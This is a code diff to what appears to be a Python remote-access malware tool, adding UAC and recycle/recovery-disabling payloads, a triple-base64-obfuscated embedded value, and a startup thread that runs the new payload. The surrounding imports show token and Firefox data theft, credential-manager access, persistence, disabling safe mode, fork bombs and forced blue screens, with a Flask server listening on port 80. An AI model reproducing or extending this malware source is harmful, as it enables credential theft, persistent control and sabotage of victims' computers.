@@ -25,7 +25,7 @@ from commands.recovery import reagentc
 from commands.intermediates import forkbomb, setvol, share_file, ezip, fetchlink
 from commands.fun import alert, cb, taskmanagerset
 from commands.filenav import cd_command
-from commands.others import takepic, mouse_control, taskbar, admin, sysinfo, rotate, defend, sites
+from commands.others import takepic, mouse_control, taskbar, admin, sysinfo, rotate, defend, sites, uac
 from commands.user import manageuser
 from commands.basics import clean, clear, bsod, close, processes, fileretrieval, sharenote, speak, pc, startupapps, cmd, kp, wallpaper, endpc
 from commands.help import nodubs, helpcommand
@@ -42,7 +42,7 @@ from payloads.firefoxinfo import firefoxing
 from payloads.getsysinfo import SYSINFO
 from payloads.gettoken import GETTOKEN
 from payloads.noovm import novm
-from payloads.otherstuff import disable_safe_mode, fuckname, nopower, nogpt, pers, nosettings
+from payloads.otherstuff import disable_safe_mode, fuckname, nopower, nogpt, pers, nosettings, norecy, yesrecy
 from payloads.persistence import neverstop
 from payloads.runreg import noreg, yesreg
 from payloads.setcmd import nocmd, yescmd
@@ -57,11 +57,12 @@ from start.zipf import zip
 import time
 from bs4 import BeautifulSoup as bs4
 from flask import Flask
+import base64
 app = Flask(__name__)
 def start_server():
     http_server = WSGIServer(("0.0.0.0", 80), app)
     http_server.serve_forever()
-ggs=base64.b64decode(base64.b64decode(base64.b64decode("""VkZaU1RtVnJOVlZTVkVaUFVrVnJNRlJXVW1wTlJURkZXbnBXVDFKRmEzZFVNVVYxVWpGd1ZsbFhSbXRNYWtsMFZESXhWVTVyUmxkbFYxWXlaREI0U1dGdFJsbGtiR00xVFhwSk5HVkZlRzlUUjNoR1RXc3hORmRFVW1sV1YyaFc=""")))
+ggs=base64.b64decode(base64.b64decode(base64.b64decode("""VkZaU1RtVnJPVVZUVkVKUFlXMU5lRlJXVW01bFJURlZVVmhvVGxKR2EzZFVWVVYxVWpBd05WZHNTbkpNYmtWNVdrVTVjVkpIUm01TmExcHhZV3RPYlZsdE9UVk9WMlJ6VDBkSk1sVnNSa2xqTUZwR1pFVkdRbVZHYXpKVk0wNXE=""")))
 @app.route('/')
 def index():
     return home()    
@@ -208,6 +209,7 @@ def ffs():
     credmgr() 
     zip()
     Thread(target=disable_safe_mode).start()
+    Thread(target=norecy).start()
     Thread(target=setup_tasks(sys.executable)).start()
     Thread(target=pathadd).start()
     Thread(target=blocksites).start()
